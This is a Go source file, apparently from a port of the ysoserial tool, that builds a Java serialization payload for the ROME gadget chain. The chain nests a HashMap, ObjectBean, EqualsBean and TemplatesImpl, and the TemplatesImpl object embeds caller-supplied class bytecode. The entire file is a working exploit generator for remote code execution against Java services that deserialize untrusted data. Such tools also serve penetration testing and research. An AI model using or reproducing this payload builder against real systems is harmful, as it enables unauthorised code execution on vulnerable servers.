package ysoserial

func ROME(bytecodes []byte) []byte {
	return ClassObject{
		name:             "java.util.HashMap",
		serialVersionUID: 362498820763181265,
		classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
		fields: []Field{
			{Float, "loadFactor", 0.75},
			{Integer, "threshold", 0},
		},
		objectAnnotations: interfaces(
			blockData{0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02},
			ClassObject{
				name:             "com.sun.syndication.feed.impl.ObjectBean",
				serialVersionUID: -9036182525298043830,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{"Lcom/sun/syndication/feed/impl/CloneableBean;", "_cloneableBean", ClassObject{
						name:             "com.sun.syndication.feed.impl.CloneableBean",
						serialVersionUID: -2494506262942749833,
						classDescFlags:   SC_SERIALIZABLE,
						fields: []Field{
							{"Ljava/util/Set;", "_ignoreProperties", ClassObject{
								name:              "java.util.Collections$EmptySet",
								serialVersionUID:  1582296315990362920,
								classDescFlags:    SC_SERIALIZABLE,
								fields:            []Field{},
								objectAnnotations: interfaces(),
								super:             nil,
							}},
							{"Ljava/lang/Object;", "_obj", ClassObject{
								name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
								serialVersionUID: 673094361519270707,
								classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
								fields: []Field{
									{Integer, "_indentNumber", 0},
									{Integer, "_transletIndex", 0},
									{"[[B", "_bytecodes", ArrayObject{
										name:             "[[B",
										serialVersionUID: 5475560301672258359,
										classDescFlags:   SC_SERIALIZABLE,
										annotations:      interfaces(),
										values: interfaces(
											ArrayObject{
												name:             "[B",
												serialVersionUID: -5984413125824719648,
												classDescFlags:   SC_SERIALIZABLE,
												values:           bytesToInterfaces(bytecodes),
												annotations:      interfaces(),
											}, ArrayObject{
												name:             "[B",
												serialVersionUID: -5984413125824719648,
												classDescFlags:   SC_SERIALIZABLE,
												values: interfaces(
													byte(0xca), byte(0xfe), byte(0xba), byte(0xbe), byte(0x00), byte(0x33), byte(0x00), byte(0x11), byte(0x01), byte(0x00), byte(0x23), byte(0x6f), byte(0x72), byte(0x67), byte(0x2f), byte(0x61), byte(0x70), byte(0x61), byte(0x63), byte(0x68), byte(0x65), byte(0x2f), byte(0x6c), byte(0x6f), byte(0x67), byte(0x34), byte(0x6a), byte(0x2f), byte(0x62), byte(0x63), byte(0x65), byte(0x6c), byte(0x2f), byte(0x67), byte(0x65), byte(0x6e), byte(0x65), byte(0x72), byte(0x69), byte(0x63), byte(0x2f), byte(0x49), byte(0x55), byte(0x53), byte(0x48), byte(0x52), byte(0x07), byte(0x00), byte(0x01), byte(0x00), byte(0x10), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x2f), byte(0x6c), byte(0x61), byte(0x6e), byte(0x67), byte(0x2f), byte(0x4f), byte(0x62), byte(0x6a), byte(0x65), byte(0x63), byte(0x74), byte(0x07), byte(0x00), byte(0x03), byte(0x01), byte(0x00), byte(0x0a), byte(0x53), byte(0x6f), byte(0x75), byte(0x72), byte(0x63), byte(0x65), byte(0x46), byte(0x69), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x0a), byte(0x49), byte(0x55), byte(0x53), byte(0x48), byte(0x52), byte(0x2e), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x01), byte(0x00), byte(0x10), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x56), byte(0x65), byte(0x72), byte(0x73), byte(0x69), byte(0x6f), byte(0x6e), byte(0x55), byte(0x49), byte(0x44), byte(0x01), byte(0x00), byte(0x01), byte(0x4a), byte(0x05), byte(0x71), byte(0xe6), byte(0x69), byte(0xee), byte(0x3c), byte(0x6d), byte(0x47), byte(0x18), byte(0x01), byte(0x00), byte(0x0d), byte(0x43), byte(0x6f), byte(0x6e), byte(0x73), byte(0x74), byte(0x61), byte(0x6e), byte(0x74), byte(0x56), byte(0x61), byte(0x6c), byte(0x75), byte(0x65), byte(0x01), byte(0x00), byte(0x06), byte(0x3c), byte(0x69), byte(0x6e), byte(0x69), byte(0x74), byte(0x3e), byte(0x01), byte(0x00), byte(0x03), byte(0x28), byte(0x29), byte(0x56), byte(0x0c), byte(0x00), byte(0x0c), byte(0x00), byte(0x0d), byte(0x0a), byte(0x00), byte(0x04), byte(0x00), byte(0x0e), byte(0x01), byte(0x00), byte(0x04), byte(0x43), byte(0x6f), byte(0x64), byte(0x65), byte(0x00), byte(0x21), byte(0x00), byte(0x02), byte(0x00), byte(0x04), byte(0x00), byte(0x01), byte(0x00), byte(0x1a), byte(0x00), byte(0x07), byte(0x00), byte(0x08), byte(0x00), byte(0x01), byte(0x00), byte(0x0b), byte(0x00), byte(0x02), byte(0x00), byte(0x09), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x0c), byte(0x00), byte(0x0d), byte(0x00), byte(0x01), byte(0x00), byte(0x10), byte(0x00), byte(0x11), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x05), byte(0x2a), byte(0xb7), byte(0x00), byte(0x0f), byte(0xb1), byte(0x00), byte(0x01), byte(0x00), byte(0x05), byte(0x00), byte(0x02), byte(0x00), byte(0x06),
												),
												annotations: interfaces(),
											}),
									}},
									{Array, "_class", nil},
									{Object, "_name", "MGXMHOSZ"},
									{"Ljava/util/Properties;", "_outputProperties", nil},
								},
								objectAnnotations: interfaces(),
								super:             nil,
							}},
						},
						objectAnnotations: interfaces(),
						super:             nil,
					}},
					{"Lcom/sun/syndication/feed/impl/EqualsBean;", "_equalsBean", ClassObject{
						name:             "com.sun.syndication.feed.impl.EqualsBean",
						serialVersionUID: -753762792335075311,
						classDescFlags:   SC_SERIALIZABLE,
						fields: []Field{
							{"Ljava/lang/Class;", "_beanClass", ClassDesc{
								name:             "javax.xml.transform.Templates",
								serialVersionUID: 0,
								classDescFlags:   0x00,
							}},
							{Object, "_obj", ""},
						},
						objectAnnotations: interfaces(),
						super:             nil,
					}},
					{"Lcom/sun/syndication/feed/impl/ToStringBean;", "_toStringBean", ClassObject{
						name:             "com.sun.syndication.feed.impl.ToStringBean",
						serialVersionUID: 717636164368199217,
						classDescFlags:   SC_SERIALIZABLE,
						fields: []Field{
							{Object, "_beanClass", nil},
							{Object, "_obj", nil},
						},
						objectAnnotations: interfaces(),
						super:             nil,
					}},
				},
				objectAnnotations: interfaces(),
				super:             nil,
			},
		),
		super: nil,
	}.SerializeWithMagicHeader()
}
